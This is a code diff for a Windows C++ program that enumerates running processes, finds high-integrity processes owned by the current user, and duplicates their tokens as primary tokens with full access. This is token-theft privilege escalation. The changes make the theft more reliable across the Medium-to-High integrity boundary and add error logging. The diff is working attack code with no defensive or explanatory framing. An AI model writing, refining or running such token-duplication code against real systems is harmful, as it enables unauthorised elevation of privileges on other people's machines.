@@ -175,41 +175,53 @@ int main() {
 
     if (Process32First(hSnap, &pe)) {
         do {
+            // PROCESS_QUERY_LIMITED_INFORMATION works cross-integrity
+            // PROCESS_QUERY_INFORMATION may be blocked by Medium->High boundary
             HANDLE hProc = OpenProcess(
-                PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
+                PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
             if (!hProc) continue;
 
-            HANDLE hTok = nullptr;
-            OpenProcessToken(hProc, TOKEN_QUERY|TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY, &hTok);
+            // First open with limited rights to check integrity/user
+            HANDLE hTokCheck = nullptr;
+            OpenProcessToken(hProc, TOKEN_QUERY, &hTokCheck);
 
-            if (hTok) {
-                DWORD level = GetTokenIntegrity(hTok);
-                bool isUser = IsCurrentUser(hTok);
+            HANDLE hTok = nullptr; // will hold duplicatable token if we want this process
 
-                if (level >= 0x3000) { // High or System
+            if (hTokCheck) {
+                DWORD level = GetTokenIntegrity(hTokCheck);
+                bool isUser = IsCurrentUser(hTokCheck);
+                CloseHandle(hTokCheck);
+
+                if (level >= 0x3000) {
                     INFO("  %-28s %6lu  %-8s  %s",
                          pe.szExeFile, pe.th32ProcessID,
                          IntegrityName(level),
                          isUser ? "<-- owned by us" : "");
                 }
 
-                // Pick the best: High integrity, owned by us, duplicatable
+                // Try to get a duplicatable token for this process
                 if (level >= 0x3000 && level < 0x4000 && isUser && !hBestToken) {
-                    // Try to duplicate directly from the token we already have
-                    HANDLE hDup = nullptr;
-                    if (DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nullptr,
-                            SecurityImpersonation, TokenPrimary, &hDup)) {
-                        hBestToken = hDup;
-                        bestPid    = pe.th32ProcessID;
-                        bestLevel  = level;
-                        strncpy_s(bestName, pe.szExeFile, MAX_PATH-1);
-                        OK("Selected + duplicated: %s (PID %lu) at %s",
-                           bestName, bestPid, IntegrityName(bestLevel));
+                    // Need TOKEN_DUPLICATE — try opening the token with full rights
+                    if (OpenProcessToken(hProc,
+                            TOKEN_QUERY|TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY, &hTok)) {
+                        HANDLE hDup = nullptr;
+                        if (DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nullptr,
+                                SecurityImpersonation, TokenPrimary, &hDup)) {
+                            hBestToken = hDup;
+                            bestPid    = pe.th32ProcessID;
+                            bestLevel  = level;
+                            strncpy_s(bestName, pe.szExeFile, MAX_PATH-1);
+                            OK("Selected + duplicated: %s (PID %lu)", bestName, bestPid);
+                        } else {
+                            DBG("DuplicateTokenEx failed for %s (PID %lu) error %lu",
+                                pe.szExeFile, pe.th32ProcessID, GetLastError());
+                        }
+                        CloseHandle(hTok);
                     } else {
-                        DBG("DuplicateTokenEx failed for %s — trying next", pe.szExeFile);
+                        DBG("OpenProcessToken (full rights) failed for %s (PID %lu) error %lu",
+                            pe.szExeFile, pe.th32ProcessID, GetLastError());
                     }
                 }
-                CloseHandle(hTok);
             }
             CloseHandle(hProc);
         } while (Process32Next(hSnap, &pe));
